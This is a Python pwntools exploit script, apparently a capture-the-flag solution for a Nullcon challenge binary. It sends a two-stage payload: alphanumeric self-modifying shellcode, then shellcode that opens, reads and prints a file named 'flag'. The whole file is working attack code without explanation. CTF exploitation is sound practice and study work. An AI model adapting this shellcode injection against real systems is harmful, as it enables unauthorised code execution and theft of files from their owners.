#!/usr/bin/python
from pwn import *
from amd64_alphanum_encoder import alphanum_encoder
import sys

# context.log_level = "debug"
config = {
	"elf" : "./gg",
	"libc" : "/lib/x86_64-linux-gnu/libc.so.6",
	"HOST" : "pwn.ctf.nullcon.net",
	"PORT" : 4010
}

def exploit(r):

	charset = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

	context.arch = "amd64"

	#############################
	# STAGE 1                   #
	# read second stage payload #
 	#############################
	shellc = asm("""
		push rsi
		pop rcx
		xor eax, 0x30363036
		xor dword ptr [rcx + 0x30], eax
		push rdi
		pop rax
		push rbx
		pop rdx
	""")
	nop2 = asm("push rax; pop rax")
	while len(shellc) < 0x30:
		shellc += nop2
	shellc += "95"
	
	print len(shellc)
	print repr(shellc)
	r.send(shellc)
	#######################
	# STAGE 2             #
	# read flag shellcode #
	#######################
	shellc = asm("""
	read:
		sub rsp, 0x1000
		mov rsi, rsp
		xor rdi, rdi
		mov rdx, 0x100
		xor rax, rax
		syscall

		mov rdi, rsp
		xor rsi, rsi
		xor rdx, rdx
		mov rax, 2
		syscall

		mov rdi, rax
		mov rsi, rsp
		mov rdx, 0x100
		xor rax, rax
		syscall

		mov rdi, 1
		mov rsi, rsp
		mov rdx, 0x100
		mov rax, 1
		syscall
	
		mov rax, 60
		syscall
	""")

	pause() # just wait for shellcode excute
	r.send("A"*0x32+shellc)
	pause() # just wait for shellcode excute
	r.send("flag\x00")
	r.interactive()
	return

if __name__ == "__main__":
	r = process(config["elf"])
	exploit(r)
